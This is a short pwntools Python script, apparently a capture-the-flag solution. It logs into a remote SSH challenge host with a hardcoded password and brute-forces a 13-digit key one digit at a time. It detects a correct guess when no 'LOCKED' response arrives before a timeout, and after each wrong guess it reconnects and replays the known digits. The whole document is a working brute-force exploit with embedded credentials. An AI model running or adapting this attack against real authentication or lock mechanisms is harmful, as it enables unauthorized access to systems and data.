from pwn import *


def conn():
    return process('sshpass -p h173 ssh -p 19527 h173@splitline.tw', shell=True, stdin=PTY)


p = conn()
key = ""
for idx in range(13):
    for try_key in range(10):
        p.send(str(try_key))
        if p.recvuntil("LOCKED", timeout=2+idx*0.2) == b'':
            key += str(try_key)
            print("[KEY]", key)
            break
        else:
            p.close()
            p = conn()
            for k in key:
                p.send(k)
